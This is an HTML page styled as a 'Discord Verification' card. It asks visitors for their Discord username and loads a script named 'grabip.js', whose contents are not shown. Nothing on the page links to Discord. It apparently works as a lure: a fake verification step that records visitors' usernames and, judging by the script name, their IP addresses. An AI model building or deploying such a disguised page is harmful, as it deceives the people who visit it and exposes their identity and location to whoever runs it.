<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            margin: 0;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
        }

        .card {
            width: min(420px, 100%);
            padding: 32px;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 14px;
            text-align: center;
        }

        h1 {
            margin-top: 0;
        }

        p {
            color: #aeb8c4;
            line-height: 1.5;
        }

        input {
            width: 100%;
            padding: 13px;
            margin-top: 12px;
            background: #0d1117;
            color: white;
            border: 1px solid #30363d;
            border-radius: 8px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 13px;
            margin-top: 12px;
            background: #5865f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        #status {
            min-height: 22px;
            margin-top: 16px;
        }

        .success {
            color: #3fb950;
        }

        .error {
            color: #f85149;
        }
    </style>
</head>

<body>
    <main class="card">
        <h1 id="title">Discord Verification</h1>

        <p id="description">
            Enter your Discord username to verify.
        </p>

        <form id="verification-form">
            <input
                id="discord-name"
                type="text"
                placeholder="Discord username"
                minlength="2"
                maxlength="64"
                required
            >

            <button id="verify-button" type="submit">
                Verify
            </button>
        </form>

        <div id="status"></div>
    </main>

    <script src="grabip.js"></script>
</body>
</html>
